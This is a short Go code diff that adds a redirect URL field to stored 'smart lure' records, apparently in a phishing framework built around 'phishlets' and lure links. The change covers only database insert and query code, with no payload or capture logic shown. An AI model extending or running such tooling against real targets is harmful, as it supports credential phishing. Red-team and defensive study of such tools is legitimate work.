@@ -86,26 +86,27 @@ type SmartLureRow struct {
 	Uses             int
 	BoundIP          string
 	RequireChallenge bool
+	RedirectURL      string
 }
 
 func (d *DB) UpsertSmartLure(r SmartLureRow) error {
-	_, err := d.sql.Exec(`INSERT INTO smart_lures(path,phishlet_id,expires_at,max_uses,uses,bound_ip,require_challenge)
-VALUES(?,?,?,?,?,?,?) ON CONFLICT(path) DO UPDATE SET phishlet_id=excluded.phishlet_id,expires_at=excluded.expires_at,max_uses=excluded.max_uses,bound_ip=excluded.bound_ip,require_challenge=excluded.require_challenge`,
-		r.Path, r.PhishletID, r.ExpiresAt, r.MaxUses, r.Uses, r.BoundIP, boolInt(r.RequireChallenge))
+	_, err := d.sql.Exec(`INSERT INTO smart_lures(path,phishlet_id,expires_at,max_uses,uses,bound_ip,require_challenge,redirect_url)
+VALUES(?,?,?,?,?,?,?,?) ON CONFLICT(path) DO UPDATE SET phishlet_id=excluded.phishlet_id,expires_at=excluded.expires_at,max_uses=excluded.max_uses,bound_ip=excluded.bound_ip,require_challenge=excluded.require_challenge,redirect_url=excluded.redirect_url`,
+		r.Path, r.PhishletID, r.ExpiresAt, r.MaxUses, r.Uses, r.BoundIP, boolInt(r.RequireChallenge), r.RedirectURL)
 	return err
 }
 
 func (d *DB) ListSmartLures() ([]SmartLureRow, error) {
-	rows, err := d.sql.Query(`SELECT path,phishlet_id,expires_at,max_uses,uses,bound_ip,require_challenge FROM smart_lures`)
+rows, err := d.sql.Query(`SELECT path,phishlet_id,expires_at,max_uses,uses,bound_ip,require_challenge,redirect_url FROM smart_lures`)
 	if err != nil {
 		return nil, err
 	}
 	defer rows.Close()
 	var out []SmartLureRow
 	for rows.Next() {
-		var r SmartLureRow
+var r SmartLureRow
 		var rc int
-		if err := rows.Scan(&r.Path, &r.PhishletID, &r.ExpiresAt, &r.MaxUses, &r.Uses, &r.BoundIP, &rc); err != nil {
+		if err := rows.Scan(&r.Path, &r.PhishletID, &r.ExpiresAt, &r.MaxUses, &r.Uses, &r.BoundIP, &rc, &r.RedirectURL); err != nil {
 			return nil, err
 		}
 		r.RequireChallenge = rc != 0
